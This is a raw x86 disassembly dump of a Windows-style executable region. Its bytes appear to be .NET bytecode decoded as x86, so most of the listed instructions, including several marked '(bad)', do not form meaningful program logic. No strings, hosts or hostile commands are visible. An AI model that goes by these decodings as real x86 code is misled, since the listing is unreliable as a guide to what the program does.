  402ad5:	2d 00 00 0a dc       	sub    $0xdc0a0000,%eax
  402ada:	06                   	push   %es
  402adb:	2c 06                	sub    $0x6,%al
  402add:	06                   	push   %es
  402ade:	6f                   	outsl  %ds:(%esi),(%dx)
  402adf:	2d 00 00 0a dc       	sub    $0xdc0a0000,%eax
  402ae4:	11 06                	adc    %eax,(%esi)
  402ae6:	2a 00                	sub    (%eax),%al
  402ae8:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402aeb:	00 02                	add    %al,(%edx)
  402aed:	00 12                	add    %dl,(%edx)
  402aef:	00 62 74             	add    %ah,0x74(%edx)
  402af2:	00 0a                	add    %cl,(%edx)
  402af4:	00 00                	add    %al,(%eax)
  402af6:	00 00                	add    %al,(%eax)
  402af8:	02 00                	add    (%eax),%al
  402afa:	0c 00                	or     $0x0,%al
  402afc:	72 7e                	jb     0x402b7c
  402afe:	00 0a                	add    %cl,(%edx)
  402b00:	00 00                	add    %al,(%eax)
  402b02:	00 00                	add    %al,(%eax)
  402b04:	1e                   	push   %ds
  402b05:	02 28                	add    (%eax),%ch
  402b07:	1b 00                	sbb    (%eax),%eax
  402b09:	00 0a                	add    %cl,(%edx)
  402b0b:	2a 13                	sub    (%ebx),%dl
  402b0d:	30 03                	xor    %al,(%ebx)
  402b0f:	00 78 00             	add    %bh,0x0(%eax)
  402b12:	00 00                	add    %al,(%eax)
  402b14:	0b 00                	or     (%eax),%eax
  402b16:	00 11                	add    %dl,(%ecx)
  402b18:	02 7b 12             	add    0x12(%ebx),%bh
  402b1b:	00 00                	add    %al,(%eax)
  402b1d:	04 28                	add    $0x28,%al
  402b1f:	79 00                	jns    0x402b21
  402b21:	00 0a                	add    %cl,(%edx)
  402b23:	0a 06                	or     (%esi),%al
  402b25:	72 a7                	jb     0x402ace
  402b27:	01 00                	add    %eax,(%eax)
  402b29:	70 6f                	jo     0x402b9a
  402b2b:	7a 00                	jp     0x402b2d
  402b2d:	00 0a                	add    %cl,(%edx)
  402b2f:	0b 07                	or     (%edi),%eax
  402b31:	14 28                	adc    $0x28,%al
  402b33:	7b 00                	jnp    0x402b35
  402b35:	00 0a                	add    %cl,(%edx)
  402b37:	2c 1b                	sub    $0x1b,%al
  402b39:	07                   	pop    %es
  402b3a:	72 cb                	jb     0x402b07
  402b3c:	01 00                	add    %eax,(%eax)
  402b3e:	70 1f                	jo     0x402b5f
  402b40:	18 6f 7c             	sbb    %ch,0x7c(%edi)
  402b43:	00 00                	add    %al,(%eax)
  402b45:	0a 25 2d 02 26 2a    	or     0x2a26022d,%ah
  402b4b:	14 14                	adc    $0x14,%al
  402b4d:	28 7d 00             	sub    %bh,0x0(%ebp)
  402b50:	00 0a                	add    %cl,(%edx)
  402b52:	26 2a 06             	sub    %es:(%esi),%al
  402b55:	6f                   	outsl  %ds:(%esi),(%dx)
  402b56:	7e 00                	jle    0x402b58
  402b58:	00 0a                	add    %cl,(%edx)
  402b5a:	0c 16                	or     $0x16,%al
  402b5c:	0d 2b 2a 08 09       	or     $0x9082a2b,%eax
  402b61:	9a 72 d3 01 00 70 1f 	lcall  $0x1f70,$0x1d372
  402b68:	18 6f 7c             	sbb    %ch,0x7c(%edi)
  402b6b:	00 00                	add    %al,(%eax)
  402b6d:	0a 13                	or     (%ebx),%dl
  402b6f:	04 11                	add    $0x11,%al
  402b71:	04 14                	add    $0x14,%al
  402b73:	28 7f 00             	sub    %bh,0x0(%edi)
  402b76:	00 0a                	add    %cl,(%edx)
  402b78:	2c 0b                	sub    $0xb,%al
  402b7a:	11 04 14             	adc    %eax,(%esp,%edx,1)
  402b7d:	14 6f                	adc    $0x6f,%al
  402b7f:	7d 00                	jge    0x402b81
  402b81:	00 0a                	add    %cl,(%edx)
  402b83:	26 2a 09             	sub    %es:(%ecx),%cl
  402b86:	17                   	pop    %ss
  402b87:	58                   	pop    %eax
  402b88:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402b8d:	32 d0                	xor    %al,%dl
  402b8f:	2a 1e                	sub    (%esi),%bl
  402b91:	02 28                	add    (%eax),%ch
  402b93:	1b 00                	sbb    (%eax),%eax
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	2a 13                	sub    (%ebx),%dl
  402b99:	30 02                	xor    %al,(%edx)
  402b9b:	00 37                	add    %dh,(%edi)
  402b9d:	00 00                	add    %al,(%eax)
  402b9f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402ba2:	00 11                	add    %dl,(%ecx)
  402ba4:	12 00                	adc    (%eax),%al
  402ba6:	28 25 00 00 0a 7d    	sub    %ah,0x7d0a0000
  402bac:	4c                   	dec    %esp
  402bad:	00 00                	add    %al,(%eax)
  402baf:	04 12                	add    $0x12,%al
  402bb1:	00 02                	add    %al,(%edx)
  402bb3:	7d 4d                	jge    0x402c02
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	04 12                	add    $0x12,%al
  402bb9:	00 15 7d 4b 00 00    	add    %dl,0x4b7d
  402bbf:	04 12                	add    $0x12,%al
  402bc1:	00 7c 4c 00          	add    %bh,0x0(%esp,%ecx,2)
  402bc5:	00 04 12             	add    %al,(%edx,%edx,1)
  402bc8:	00 28                	add    %ch,(%eax)
  402bca:	0a 00                	or     (%eax),%al
  402bcc:	00 2b                	add    %ch,(%ebx)
  402bce:	12 00                	adc    (%eax),%al
  402bd0:	7c 4c                	jl     0x402c1e
  402bd2:	00 00                	add    %al,(%eax)
  402bd4:	04 28                	add    $0x28,%al
  402bd6:	27                   	daa
  402bd7:	00 00                	add    %al,(%eax)
  402bd9:	0a 2a                	or     (%edx),%ch
  402bdb:	1e                   	push   %ds
  402bdc:	02 28                	add    (%eax),%ch
  402bde:	1b 00                	sbb    (%eax),%eax
  402be0:	00 0a                	add    %cl,(%edx)
  402be2:	2a 00                	sub    (%eax),%al
  402be4:	13 30                	adc    (%eax),%esi
  402be6:	02 00                	add    (%eax),%al
  402be8:	37                   	aaa
  402be9:	00 00                	add    %al,(%eax)
  402beb:	00 0d 00 00 11 12    	add    %cl,0x12110000
  402bf1:	00 28                	add    %ch,(%eax)
  402bf3:	25 00 00 0a 7d       	and    $0x7d0a0000,%eax
  402bf8:	50                   	push   %eax
  402bf9:	00 00                	add    %al,(%eax)
  402bfb:	04 12                	add    $0x12,%al
  402bfd:	00 02                	add    %al,(%edx)
  402bff:	7d 51                	jge    0x402c52
  402c01:	00 00                	add    %al,(%eax)
  402c03:	04 12                	add    $0x12,%al
  402c05:	00 15 7d 4f 00 00    	add    %dl,0x4f7d
  402c0b:	04 12                	add    $0x12,%al
  402c0d:	00 7c 50 00          	add    %bh,0x0(%eax,%edx,2)
  402c11:	00 04 12             	add    %al,(%edx,%edx,1)
  402c14:	00 28                	add    %ch,(%eax)
  402c16:	0b 00                	or     (%eax),%eax
  402c18:	00 2b                	add    %ch,(%ebx)
  402c1a:	12 00                	adc    (%eax),%al
  402c1c:	7c 50                	jl     0x402c6e
  402c1e:	00 00                	add    %al,(%eax)
  402c20:	04 28                	add    $0x28,%al
  402c22:	27                   	daa
  402c23:	00 00                	add    %al,(%eax)
  402c25:	0a 2a                	or     (%edx),%ch
  402c27:	1e                   	push   %ds
  402c28:	02 28                	add    (%eax),%ch
  402c2a:	1b 00                	sbb    (%eax),%eax
  402c2c:	00 0a                	add    %cl,(%edx)
  402c2e:	2a 32                	sub    (%edx),%dh
  402c30:	02 7b 1a             	add    0x1a(%ebx),%bh
  402c33:	00 00                	add    %al,(%eax)
  402c35:	04 28                	add    $0x28,%al
  402c37:	80 00 00             	addb   $0x0,(%eax)
  402c3a:	0a 2a                	or     (%edx),%ch
  402c3c:	1b 30                	sbb    (%eax),%esi
  402c3e:	03 00                	add    (%eax),%eax
  402c40:	ac                   	lods   %ds:(%esi),%al
  402c41:	00 00                	add    %al,(%eax)
  402c43:	00 0e                	add    %cl,(%esi)
  402c45:	00 00                	add    %al,(%eax)
  402c47:	11 02                	adc    %eax,(%edx)
  402c49:	7b 1b                	jnp    0x402c66
  402c4b:	00 00                	add    %al,(%eax)
  402c4d:	04 0a                	add    $0xa,%al
  402c4f:	06                   	push   %es
  402c50:	2c 50                	sub    $0x50,%al
  402c52:	73 19                	jae    0x402c6d
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	25 02 7b 1d 00       	and    $0x1d7b02,%eax
  402c5c:	00 04 7d 11 00 00 04 	add    %al,0x4000011(,%edi,2)
  402c63:	fe 06                	incb   (%esi)
  402c65:	1a 00                	sbb    (%eax),%al
  402c67:	00 06                	add    %al,(%esi)
  402c69:	73 81                	jae    0x402bec
  402c6b:	00 00                	add    %al,(%eax)
  402c6d:	0a 28                	or     (%eax),%ch
  402c6f:	0c 00                	or     $0x0,%al
  402c71:	00 2b                	add    %ch,(%ebx)
  402c73:	6f                   	outsl  %ds:(%esi),(%dx)
  402c74:	83 00 00             	addl   $0x0,(%eax)
  402c77:	0a 0c 12             	or     (%edx,%edx,1),%cl
  402c7a:	02 28                	add    (%eax),%ch
  402c7c:	84 00                	test   %al,(%eax)
  402c7e:	00 0a                	add    %cl,(%edx)
  402c80:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  402c85:	0a 7d 1b             	or     0x1b(%ebp),%bh
  402c88:	00 00                	add    %al,(%eax)
  402c8a:	04 02                	add    $0x2,%al
  402c8c:	08 7d 1e             	or     %bh,0x1e(%ebp)
  402c8f:	00 00                	add    %al,(%eax)
  402c91:	04 02                	add    $0x2,%al
  402c93:	7c 1c                	jl     0x402cb1
  402c95:	00 00                	add    %al,(%eax)
  402c97:	04 12                	add    $0x12,%al
  402c99:	02 02                	add    (%edx),%al
  402c9b:	28 0d 00 00 2b de    	sub    %cl,0xde2b0000
  402ca1:	51                   	push   %ecx
  402ca2:	02 7b 1e             	add    0x1e(%ebx),%bh
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	04 0c                	add    $0xc,%al
  402ca9:	02 7c 1e 00          	add    0x0(%esi,%ebx,1),%bh
  402cad:	00 04 fe             	add    %al,(%esi,%edi,8)
  402cb0:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  402cb5:	02 15 25 0a 7d 1b    	add    0x1b7d0a25,%dl
  402cbb:	00 00                	add    %al,(%eax)
  402cbd:	04 12                	add    $0x12,%al
  402cbf:	02 28                	add    (%eax),%ch
  402cc1:	86 00                	xchg   %al,(%eax)
  402cc3:	00 0a                	add    %cl,(%edx)
  402cc5:	0b de                	or     %esi,%ebx
  402cc7:	17                   	pop    %ss
  402cc8:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  402ccd:	1b 00                	sbb    (%eax),%eax
  402ccf:	00 04 02             	add    %al,(%edx,%eax,1)
  402cd2:	7c 1c                	jl     0x402cf0
  402cd4:	00 00                	add    %al,(%eax)
  402cd6:	04 09                	add    $0x9,%al
  402cd8:	28 87 00 00 0a de    	sub    %al,-0x21f60000(%edi)
  402cde:	14 02                	adc    $0x2,%al
  402ce0:	1f                   	pop    %ds
  402ce1:	fe                   	(bad)
  402ce2:	7d 1b                	jge    0x402cff
  402ce4:	00 00                	add    %al,(%eax)
  402ce6:	04 02                	add    $0x2,%al
  402ce8:	7c 1c                	jl     0x402d06
  402cea:	00 00                	add    %al,(%eax)
  402cec:	04 07                	add    $0x7,%al
  402cee:	28 88 00 00 0a 2a    	sub    %cl,0x2a0a0000(%eax)
  402cf4:	01 10                	add    %edx,(%eax)
  402cf6:	00 00                	add    %al,(%eax)
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	07                   	pop    %es
  402cfb:	00 79 80             	add    %bh,-0x80(%ecx)
  402cfe:	00 17                	add    %dl,(%edi)
  402d00:	34 00                	xor    $0x0,%al
  402d02:	00 01                	add    %al,(%ecx)
  402d04:	36 02 7c 1c 00       	add    %ss:0x0(%esp,%ebx,1),%bh
  402d09:	00 04 03             	add    %al,(%ebx,%eax,1)
  402d0c:	28 89 00 00 0a 2a    	sub    %cl,0x2a0a0000(%ecx)
  402d12:	00 00                	add    %al,(%eax)
  402d14:	1b 30                	sbb    (%eax),%esi
  402d16:	03 00                	add    (%eax),%eax
  402d18:	af                   	scas   %es:(%edi),%eax
  402d19:	01 00                	add    %eax,(%eax)
  402d1b:	00 0f                	add    %cl,(%edi)
  402d1d:	00 00                	add    %al,(%eax)
  402d1f:	11 02                	adc    %eax,(%edx)
  402d21:	7b 1f                	jnp    0x402d42
  402d23:	00 00                	add    %al,(%eax)
  402d25:	04 0a                	add    $0xa,%al
  402d27:	02 7b 21             	add    0x21(%ebx),%bh
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	04 0b                	add    $0xb,%al
  402d2e:	06                   	push   %es
  402d2f:	39 94 00 00 00 06 17 	cmp    %edx,0x17060000(%eax,%eax,1)
  402d36:	3b 12                	cmp    (%edx),%edx
  402d38:	01 00                	add    %eax,(%eax)
  402d3a:	00 02                	add    %al,(%edx)
  402d3c:	73 1d                	jae    0x402d5b
  402d3e:	00 00                	add    %al,(%eax)
  402d40:	06                   	push   %es
  402d41:	7d 23                	jge    0x402d66
  402d43:	00 00                	add    %al,(%eax)
  402d45:	04 02                	add    $0x2,%al
  402d47:	7b 23                	jnp    0x402d6c
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	04 02                	add    $0x2,%al
  402d4d:	7b 21                	jnp    0x402d70
  402d4f:	00 00                	add    %al,(%eax)
  402d51:	04 7d                	add    $0x7d,%al
  402d53:	13 00                	adc    (%eax),%eax
  402d55:	00 04 02             	add    %al,(%edx,%eax,1)
  402d58:	7b 23                	jnp    0x402d7d
  402d5a:	00 00                	add    %al,(%eax)
  402d5c:	04 02                	add    $0x2,%al
  402d5e:	7b 22                	jnp    0x402d82
  402d60:	00 00                	add    %al,(%eax)
  402d62:	04 7d                	add    $0x7d,%al
  402d64:	14 00                	adc    $0x0,%al
  402d66:	00 04 07             	add    %al,(%edi,%eax,1)
  402d69:	7b 06                	jnp    0x402d71
  402d6b:	00 00                	add    %al,(%eax)
  402d6d:	04 6f                	add    $0x6f,%al
  402d6f:	6b 00 00             	imul   $0x0,(%eax),%eax
  402d72:	0a 2c 7b             	or     (%ebx,%edi,2),%ch
  402d75:	07                   	pop    %es
  402d76:	7b 06                	jnp    0x402d7e
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	04 02                	add    $0x2,%al
  402d7c:	7b 23                	jnp    0x402da1
  402d7e:	00 00                	add    %al,(%eax)
  402d80:	04 fe                	add    $0xfe,%al
  402d82:	06                   	push   %es
  402d83:	1e                   	push   %ds
  402d84:	00 00                	add    %al,(%eax)
  402d86:	06                   	push   %es
  402d87:	73 8a                	jae    0x402d13
  402d89:	00 00                	add    %al,(%eax)
  402d8b:	0a 6f 6d             	or     0x6d(%edi),%ch
  402d8e:	00 00                	add    %al,(%eax)
  402d90:	0a 74 27 00          	or     0x0(%edi,%eiz,1),%dh
  402d94:	00 01                	add    %al,(%ecx)
  402d96:	6f                   	outsl  %ds:(%esi),(%dx)
  402d97:	8b 00                	mov    (%eax),%eax
  402d99:	00 0a                	add    %cl,(%edx)
  402d9b:	0c 12                	or     $0x12,%al
  402d9d:	02 28                	add    (%eax),%ch
  402d9f:	8c 00                	mov    %es,(%eax)
  402da1:	00 0a                	add    %cl,(%edx)
  402da3:	2d 3f 02 16 25       	sub    $0x2516023f,%eax
  402da8:	0a 7d 1f             	or     0x1f(%ebp),%bh
  402dab:	00 00                	add    %al,(%eax)
  402dad:	04 02                	add    $0x2,%al
  402daf:	08 7d 24             	or     %bh,0x24(%ebp)
  402db2:	00 00                	add    %al,(%eax)
  402db4:	04 02                	add    $0x2,%al
  402db6:	7c 20                	jl     0x402dd8
  402db8:	00 00                	add    %al,(%eax)
  402dba:	04 12                	add    $0x12,%al
  402dbc:	02 02                	add    (%edx),%al
  402dbe:	28 0e                	sub    %cl,(%esi)
  402dc0:	00 00                	add    %al,(%eax)
  402dc2:	2b dd                	sub    %ebp,%ebx
  402dc4:	06                   	push   %es
  402dc5:	01 00                	add    %eax,(%eax)
  402dc7:	00 02                	add    %al,(%edx)
  402dc9:	7b 24                	jnp    0x402def
  402dcb:	00 00                	add    %al,(%eax)
  402dcd:	04 0c                	add    $0xc,%al
  402dcf:	02 7c 24 00          	add    0x0(%esp),%bh
  402dd3:	00 04 fe             	add    %al,(%esi,%edi,8)
  402dd6:	15 33 00 00 01       	adc    $0x1000033,%eax
  402ddb:	02 15 25 0a 7d 1f    	add    0x1f7d0a25,%dl
  402de1:	00 00                	add    %al,(%eax)
  402de3:	04 12                	add    $0x12,%al
  402de5:	02 28                	add    (%eax),%ch
  402de7:	8e 00                	mov    (%eax),%es
  402de9:	00 0a                	add    %cl,(%edx)
  402deb:	dd c4                	ffree  %st(4)
  402ded:	00 00                	add    %al,(%eax)
  402def:	00 02                	add    %al,(%edx)
  402df1:	07                   	pop    %es
  402df2:	7b 06                	jnp    0x402dfa
  402df4:	00 00                	add    %al,(%eax)
  402df6:	04 6f                	add    $0x6f,%al
  402df8:	8f 00                	pop    (%eax)
  402dfa:	00 0a                	add    %cl,(%edx)
  402dfc:	7d 25                	jge    0x402e23
  402dfe:	00 00                	add    %al,(%eax)
  402e00:	04 2b                	add    $0x2b,%al
  402e02:	7b 07                	jnp    0x402e0b
  402e04:	7b 06                	jnp    0x402e0c
  402e06:	00 00                	add    %al,(%eax)
  402e08:	04 02                	add    $0x2,%al
  402e0a:	7b 25                	jnp    0x402e31
  402e0c:	00 00                	add    %al,(%eax)
  402e0e:	04 6f                	add    $0x6f,%al
  402e10:	90                   	nop
  402e11:	00 00                	add    %al,(%eax)
  402e13:	0a 1f                	or     (%edi),%bl
  402e15:	1e                   	push   %ds
  402e16:	28 91 00 00 0a 6f    	sub    %dl,0x6f0a0000(%ecx)
  402e1c:	8b 00                	mov    (%eax),%eax
  402e1e:	00 0a                	add    %cl,(%edx)
  402e20:	0c 12                	or     $0x12,%al
  402e22:	02 28                	add    (%eax),%ch
  402e24:	8c 00                	mov    %es,(%eax)
  402e26:	00 0a                	add    %cl,(%edx)
  402e28:	2d 3f 02 17 25       	sub    $0x2517023f,%eax
  402e2d:	0a 7d 1f             	or     0x1f(%ebp),%bh
  402e30:	00 00                	add    %al,(%eax)
  402e32:	04 02                	add    $0x2,%al
  402e34:	08 7d 24             	or     %bh,0x24(%ebp)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	04 02                	add    $0x2,%al
  402e3b:	7c 20                	jl     0x402e5d
  402e3d:	00 00                	add    %al,(%eax)
  402e3f:	04 12                	add    $0x12,%al
  402e41:	02 02                	add    (%edx),%al
  402e43:	28 0e                	sub    %cl,(%esi)
  402e45:	00 00                	add    %al,(%eax)
  402e47:	2b dd                	sub    %ebp,%ebx
  402e49:	81 00 00 00 02 7b    	addl   $0x7b020000,(%eax)
  402e4f:	24 00                	and    $0x0,%al
  402e51:	00 04 0c             	add    %al,(%esp,%ecx,1)
  402e54:	02 7c 24 00          	add    0x0(%esp),%bh
  402e58:	00 04 fe             	add    %al,(%esi,%edi,8)
  402e5b:	15 33 00 00 01       	adc    $0x1000033,%eax
  402e60:	02 15 25 0a 7d 1f    	add    0x1f7d0a25,%dl
  402e66:	00 00                	add    %al,(%eax)
  402e68:	04 12                	add    $0x12,%al
  402e6a:	02 28                	add    (%eax),%ch
  402e6c:	8e 00                	mov    (%eax),%es
  402e6e:	00 0a                	add    %cl,(%edx)
  402e70:	02 02                	add    (%edx),%al
  402e72:	7b 25                	jnp    0x402e99
  402e74:	00 00                	add    %al,(%eax)
  402e76:	04 1b                	add    $0x1b,%al
  402e78:	58                   	pop    %eax
  402e79:	7d 25                	jge    0x402ea0
  402e7b:	00 00                	add    %al,(%eax)
  402e7d:	04 02                	add    $0x2,%al
  402e7f:	7b 25                	jnp    0x402ea6
  402e81:	00 00                	add    %al,(%eax)
  402e83:	04 02                	add    $0x2,%al
  402e85:	7b 23                	jnp    0x402eaa
  402e87:	00 00                	add    %al,(%eax)
  402e89:	04 7b                	add    $0x7b,%al
  402e8b:	14 00                	adc    $0x0,%al
  402e8d:	00 04 3e             	add    %al,(%esi,%edi,1)
  402e90:	6f                   	outsl  %ds:(%esi),(%dx)
  402e91:	ff                   	(bad)
  402e92:	ff                   	(bad)
  402e93:	ff                   	lcall  (bad)
  402e94:	de 1e                	ficomps (%esi)
  402e96:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  402e9b:	1f                   	pop    %ds
  402e9c:	00 00                	add    %al,(%eax)
  402e9e:	04 02                	add    $0x2,%al
  402ea0:	14 7d                	adc    $0x7d,%al
  402ea2:	23 00                	and    (%eax),%eax
  402ea4:	00 04 02             	add    %al,(%edx,%eax,1)
  402ea7:	7c 20                	jl     0x402ec9
  402ea9:	00 00                	add    %al,(%eax)
  402eab:	04 09                	add    $0x9,%al
  402ead:	28 92 00 00 0a de    	sub    %dl,-0x21f60000(%edx)
  402eb3:	1a 02                	sbb    (%edx),%al
  402eb5:	1f                   	pop    %ds
  402eb6:	fe                   	(bad)
  402eb7:	7d 1f                	jge    0x402ed8
  402eb9:	00 00                	add    %al,(%eax)
  402ebb:	04 02                	add    $0x2,%al
  402ebd:	14 7d                	adc    $0x7d,%al
  402ebf:	23 00                	and    (%eax),%eax
  402ec1:	00 04 02             	add    %al,(%edx,%eax,1)
  402ec4:	7c 20                	jl     0x402ee6
  402ec6:	00 00                	add    %al,(%eax)
  402ec8:	04 28                	add    $0x28,%al
  402eca:	93                   	xchg   %eax,%ebx
  402ecb:	00 00                	add    %al,(%eax)
  402ecd:	0a 2a                	or     (%edx),%ch
  402ecf:	00 41 1c             	add    %al,0x1c(%ecx)
  402ed2:	00 00                	add    %al,(%eax)
  402ed4:	00 00                	add    %al,(%eax)
  402ed6:	00 00                	add    %al,(%eax)
  402ed8:	0e                   	push   %cs
  402ed9:	00 00                	add    %al,(%eax)
  402edb:	00 68 01             	add    %ch,0x1(%eax)
  402ede:	00 00                	add    %al,(%eax)
  402ee0:	76 01                	jbe    0x402ee3
  402ee2:	00 00                	add    %al,(%eax)
  402ee4:	1e                   	push   %ds
  402ee5:	00 00                	add    %al,(%eax)
  402ee7:	00 34 00             	add    %dh,(%eax,%eax,1)
  402eea:	00 01                	add    %al,(%ecx)
  402eec:	36 02 7c 20 00       	add    %ss:0x0(%eax,%eiz,1),%bh
  402ef1:	00 04 03             	add    %al,(%ebx,%eax,1)
  402ef4:	28 94 00 00 0a 2a 00 	sub    %dl,0x2a0a00(%eax,%eax,1)
  402efb:	00 1b                	add    %bl,(%ebx)
  402efd:	30 03                	xor    %al,(%ebx)
  402eff:	00 ac 00 00 00 10 00 	add    %ch,0x100000(%eax,%eax,1)
  402f06:	00 11                	add    %dl,(%ecx)
  402f08:	02 7b 26             	add    0x26(%ebx),%bh
  402f0b:	00 00                	add    %al,(%eax)
  402f0d:	04 0a                	add    $0xa,%al
  402f0f:	06                   	push   %es
  402f10:	2c 50                	sub    $0x50,%al
  402f12:	73 21                	jae    0x402f35
  402f14:	00 00                	add    %al,(%eax)
  402f16:	06                   	push   %es
  402f17:	25 02 7b 28 00       	and    $0x287b02,%eax
  402f1c:	00 04 7d 1a 00 00 04 	add    %al,0x400001a(,%edi,2)
  402f23:	fe 06                	incb   (%esi)
  402f25:	22 00                	and    (%eax),%al
  402f27:	00 06                	add    %al,(%esi)
  402f29:	73 95                	jae    0x402ec0
  402f2b:	00 00                	add    %al,(%eax)
  402f2d:	0a 28                	or     (%eax),%ch
  402f2f:	0f 00 00             	sldt   (%eax)
  402f32:	2b 6f 96             	sub    -0x6a(%edi),%ebp
  402f35:	00 00                	add    %al,(%eax)
  402f37:	0a 0c 12             	or     (%edx,%edx,1),%cl
  402f3a:	02 28                	add    (%eax),%ch
  402f3c:	97                   	xchg   %eax,%edi
  402f3d:	00 00                	add    %al,(%eax)
  402f3f:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  402f45:	0a 7d 26             	or     0x26(%ebp),%bh
  402f48:	00 00                	add    %al,(%eax)
  402f4a:	04 02                	add    $0x2,%al
  402f4c:	08 7d 29             	or     %bh,0x29(%ebp)
  402f4f:	00 00                	add    %al,(%eax)
  402f51:	04 02                	add    $0x2,%al
  402f53:	7c 27                	jl     0x402f7c
  402f55:	00 00                	add    %al,(%eax)
  402f57:	04 12                	add    $0x12,%al
  402f59:	02 02                	add    (%edx),%al
  402f5b:	28 10                	sub    %dl,(%eax)
  402f5d:	00 00                	add    %al,(%eax)
  402f5f:	2b de                	sub    %esi,%ebx
  402f61:	51                   	push   %ecx
  402f62:	02 7b 29             	add    0x29(%ebx),%bh
  402f65:	00 00                	add    %al,(%eax)
  402f67:	04 0c                	add    $0xc,%al
  402f69:	02 7c 29 00          	add    0x0(%ecx,%ebp,1),%bh
  402f6d:	00 04 fe             	add    %al,(%esi,%edi,8)
  402f70:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  402f75:	02 15 25 0a 7d 26    	add    0x267d0a25,%dl
  402f7b:	00 00                	add    %al,(%eax)
  402f7d:	04 12                	add    $0x12,%al
  402f7f:	02 28                	add    (%eax),%ch
  402f81:	99                   	cltd
  402f82:	00 00                	add    %al,(%eax)
  402f84:	0a 0b                	or     (%ebx),%cl
  402f86:	de 17                	ficoms (%edi)
  402f88:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  402f8d:	26 00 00             	add    %al,%es:(%eax)
  402f90:	04 02                	add    $0x2,%al
  402f92:	7c 27                	jl     0x402fbb
  402f94:	00 00                	add    %al,(%eax)
  402f96:	04 09                	add    $0x9,%al
  402f98:	28 9a 00 00 0a de    	sub    %bl,-0x21f60000(%edx)
  402f9e:	14 02                	adc    $0x2,%al
  402fa0:	1f                   	pop    %ds
  402fa1:	fe                   	(bad)
  402fa2:	7d 26                	jge    0x402fca
  402fa4:	00 00                	add    %al,(%eax)
  402fa6:	04 02                	add    $0x2,%al
  402fa8:	7c 27                	jl     0x402fd1
  402faa:	00 00                	add    %al,(%eax)
  402fac:	04 07                	add    $0x7,%al
  402fae:	28 9b 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ebx)
  402fb4:	01 10                	add    %edx,(%eax)
  402fb6:	00 00                	add    %al,(%eax)
  402fb8:	00 00                	add    %al,(%eax)
  402fba:	07                   	pop    %es
  402fbb:	00 79 80             	add    %bh,-0x80(%ecx)
  402fbe:	00 17                	add    %dl,(%edi)
  402fc0:	34 00                	xor    $0x0,%al
  402fc2:	00 01                	add    %al,(%ecx)
  402fc4:	36 02 7c 27 00       	add    %ss:0x0(%edi,%eiz,1),%bh
  402fc9:	00 04 03             	add    %al,(%ebx,%eax,1)
  402fcc:	28 9c 00 00 0a 2a 00 	sub    %bl,0x2a0a00(%eax,%eax,1)
  402fd3:	00 1b                	add    %bl,(%ebx)
  402fd5:	30 05 00 f0 03 00    	xor    %al,0x3f000
  402fdb:	00 11                	add    %dl,(%ecx)
  402fdd:	00 00                	add    %al,(%eax)
  402fdf:	11 02                	adc    %eax,(%edx)
  402fe1:	7b 2a                	jnp    0x40300d
  402fe3:	00 00                	add    %al,(%eax)
  402fe5:	04 0a                	add    $0xa,%al
  402fe7:	02 7b 2c             	add    0x2c(%ebx),%bh
  402fea:	00 00                	add    %al,(%eax)
  402fec:	04 0b                	add    $0xb,%al
  402fee:	06                   	push   %es
  402fef:	1c 36                	sbb    $0x36,%al
  402ff1:	0e                   	push   %cs
  402ff2:	06                   	push   %es
  402ff3:	1d 3b 7e 03 00       	sbb    $0x37e3b,%eax
  402ff8:	00 02                	add    %al,(%edx)
  402ffa:	16                   	push   %ss
  402ffb:	7d 2e                	jge    0x40302b
  402ffd:	00 00                	add    %al,(%eax)
  402fff:	04 00                	add    $0x0,%al
  403001:	06                   	push   %es
  403002:	45                   	inc    %ebp
  403003:	07                   	pop    %es
  403004:	00 00                	add    %al,(%eax)
  403006:	00 39                	add    %bh,(%ecx)
  403008:	00 00                	add    %al,(%eax)
  40300a:	00 96 00 00 00 18    	add    %dl,0x18000000(%esi)
  403010:	01 00                	add    %eax,(%eax)
  403012:	00 83 01 00 00 eb    	add    %al,-0x14ffffff(%ebx)
  403018:	01 00                	add    %eax,(%eax)
  40301a:	00 59 02             	add    %bl,0x2(%ecx)
  40301d:	00 00                	add    %al,(%eax)
  40301f:	ba 02 00 00 07       	mov    $0x7000002,%edx
  403024:	16                   	push   %ss
  403025:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  403028:	00 06                	add    %al,(%esi)
  40302a:	6f                   	outsl  %ds:(%esi),(%dx)
  40302b:	8b 00                	mov    (%eax),%eax
  40302d:	00 0a                	add    %cl,(%edx)
  40302f:	0d 12 03 28 8c       	or     $0x8c280312,%eax
  403034:	00 00                	add    %al,(%eax)
  403036:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  40303c:	0a 7d 2a             	or     0x2a(%ebp),%bh
  40303f:	00 00                	add    %al,(%eax)
  403041:	04 02                	add    $0x2,%al
  403043:	09 7d 30             	or     %edi,0x30(%ebp)
  403046:	00 00                	add    %al,(%eax)
  403048:	04 02                	add    $0x2,%al
  40304a:	7c 2b                	jl     0x403077
  40304c:	00 00                	add    %al,(%eax)
  40304e:	04 12                	add    $0x12,%al
  403050:	03 02                	add    (%edx),%eax
  403052:	28 11                	sub    %dl,(%ecx)
  403054:	00 00                	add    %al,(%eax)
  403056:	2b dd                	sub    %ebp,%ebx
  403058:	73 03                	jae    0x40305d
  40305a:	00 00                	add    %al,(%eax)
  40305c:	02 7b 30             	add    0x30(%ebx),%bh
  40305f:	00 00                	add    %al,(%eax)
  403061:	04 0d                	add    $0xd,%al
  403063:	02 7c 30 00          	add    0x0(%eax,%esi,1),%bh
  403067:	00 04 fe             	add    %al,(%esi,%edi,8)
